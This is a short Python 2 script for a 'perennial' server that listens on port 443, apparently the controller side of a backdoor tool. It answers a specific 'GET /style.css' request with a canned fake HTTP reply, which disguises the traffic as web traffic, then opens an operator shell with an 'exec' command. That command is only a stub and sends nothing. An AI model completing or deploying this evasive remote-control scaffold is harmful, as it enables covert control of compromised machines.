#!/usr/bin/env python

import re
import socket
import argparse
from datetime import datetime

SIZE = 1024


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def ctrl_shell_server(s, PORT):
    print '[+] ({}) Entering perennial shell (psh)'.format(datetime.now())
    conn, addr = s.accept()
    while True:
        try:
            inp = raw_input('psh > ')
            if inp == 'exit':
                break
            elif inp == '':
                continue
            elif inp == 'help':
                print 'commands:\n  exec'
            elif inp.startswith('exec'):
                if re.search('^exec (".+"\ )+$', inp + ' '):
                    print 'execing'
                else:
                    print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
            else:
                print 'psh: command not found'
        except KeyboardInterrupt:
            break
    conn.close()
    print '[+] ({}) Exiting control shell.'.format(datetime.now())


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', PORT))
    s.listen(1)

    print '[+] Perennial server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
    ping = conn.recv(SIZE)
    if ping.startswith('GET /style.css HTTP/1.1'):
        with open('fakeOK.txt') as ok:
            conn.send(ok.read())
        conn.close()
        ctrl_shell_server(s, PORT)

if __name__ == '__main__':
    main()
